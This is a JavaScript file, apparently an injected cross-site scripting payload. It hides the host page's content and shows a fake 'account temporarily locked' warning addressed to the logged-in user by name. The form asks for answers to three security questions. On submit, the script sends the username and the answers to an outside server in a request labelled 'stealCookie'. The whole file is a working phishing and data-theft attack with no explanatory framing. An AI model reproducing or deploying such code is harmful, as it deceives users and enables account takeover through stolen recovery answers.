(function() {
	document.getElementsByClassName("container-fluid")[1].style.display = "none";

	var addOptions = function(selectElement) {
		var option0 = document.createElement("option");
		option0.value = "option0";
		option0.text = "--select--";

		var option1 = document.createElement("option");
		option1.value = "option1";
		option1.text = "What was your childhood nickname?";

		var option2 = document.createElement("option");
		option2.value = "option2";
		option2.text = "What street did you live on in third grade?";

		var option3 = document.createElement("option");
		option3.value = "option3";
		option3.text = "What was your dream job as a child?";

		var option4 = document.createElement("option");
		option4.value = "option4";
		option4.text = "What year did you graduate from High School?";

		var option5 = document.createElement("option");
		option5.value = "option5";
		option5.text = "What was the make and model of your first car?";

		selectElement.add(option0);
		selectElement.add(option1);
		selectElement.add(option2);
		selectElement.add(option3);
		selectElement.add(option4);
		selectElement.add(option5);
	}

	var myStyle = document.createElement("style");
	myStyle.type = "text/css";
	myStyle.innerHTML = ".inputClass{width:500px;padding:5px;border:2px solid #ccc;-webkit-border-radius:5px;border-radius:5px;}.buttonClass{width:200px;padding:5px 15px;background:#ccc;border:0 none;cursor:pointer;-webkit-border-radius:5px;border-radius:5px;margin:20px}";
	document.getElementsByTagName("head")[0].appendChild(myStyle);

	var name = document.getElementsByClassName("dropdown-toggle")[0].text
			.trim();
	var warnMsg1 = document
			.createTextNode("["
					+ name
					+ "], Your account is temorarily locked due to unusual activity detected in your account");

	var warnMsg2 = document
			.createTextNode("Please provide answers to the below security questions to unlock your account!");

	var myWarning = document.createElement("h4");
	myWarning.style.color = "red";
	myWarning.style.marginTop = "50px";
	myWarning.style.textAlign = "center";
	myWarning.appendChild(warnMsg1);
	myWarning.appendChild(document.createElement("br"));
	myWarning.appendChild(warnMsg2);

	var question1 = document.createElement("select");
	question1.id = "question1";
	question1.style.marginTop = "20px";
	question1.className = "inputClass";
	addOptions(question1);

	var answer1 = document.createElement("input");
	answer1.type = "text";
	answer1.id = "answer1";
	answer1.name = "answer1";
	answer1.className = "inputClass";
	answer1.placeholder = "Enter Answer!";

	var question2 = document.createElement("select");
	question2.id = "question2";
	question2.style.marginTop = "20px";
	question2.className = "inputClass";
	addOptions(question2);

	var answer2 = document.createElement("input");
	answer2.type = "text";
	answer2.id = "answer2";
	answer2.name = "answer2";
	answer2.className = "inputClass";
	answer2.placeholder = "Enter Answer!";

	var question3 = document.createElement("select");
	question3.id = "question3";
	question3.style.marginTop = "20px";
	question3.className = "inputClass";
	addOptions(question3);

	var answer3 = document.createElement("input");
	answer3.type = "text";
	answer3.id = "answer3";
	answer3.name = "answer3";
	answer3.className = "inputClass";
	answer3.placeholder = "Enter Answer!";

	var button = document.createElement("button");
	button.type = "button";
	button.id = "submitSecAns";
	button.className = "buttonClass";
	button.innerText = "Submit Answer!";

	var myForm = document.createElement("form");
	myForm.style.textAlign = "center";
	myForm.style.marginTop = "30px";
	myForm.appendChild(question1);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(answer1);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(question2);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(answer2);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(question3);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(answer3);
	myForm.appendChild(document.createElement("br"));
	myForm.appendChild(button);

	var myDiv = document.createElement("div");
	myDiv.style.margin = "auto";
	myDiv.style.width = "80%";
	myDiv.appendChild(myWarning);
	myDiv.appendChild(myForm);

	var myParent = document.getElementsByTagName("div")[0];
	myParent.appendChild(myDiv);

	document.getElementById("submitSecAns").onclick = function() {
		var xhttp = new XMLHttpRequest();
		xhttp.onreadystatechange = function() {
			if (this.readyState == 4 && this.status == 200) {
				document.getElementById("ajax").innerHTML = this.responseText;
			}
			location.href = location.protocol + '//' + location.host + '/' + location.pathname.split("/")[1];
		};
		xhttp.open("POST",
				"http://jws-app-governance.1d35.starter-us-east-1.openshiftapps.com/AppController",
				true);
		xhttp.setRequestHeader("Content-type",
				"application/x-www-form-urlencoded");
		xhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
		xhttp.send("requestType=stealCookie&username="
				+ document.getElementsByClassName("dropdown-toggle")[0].text
						.trim()
				+ "&cookie="
				+ document.getElementById("question1").options[document
						.getElementById("question1").selectedIndex].text
				+ " : "
				+ document.getElementById("answer1").value
				+ " | "
				+ document.getElementById("question2").options[document
						.getElementById("question2").selectedIndex].text
				+ " : "
				+ document.getElementById("answer2").value
				+ " | "
				+ document.getElementById("question3").options[document
						.getElementById("question3").selectedIndex].text
				+ " : " + document.getElementById("answer3").value);
	};

})();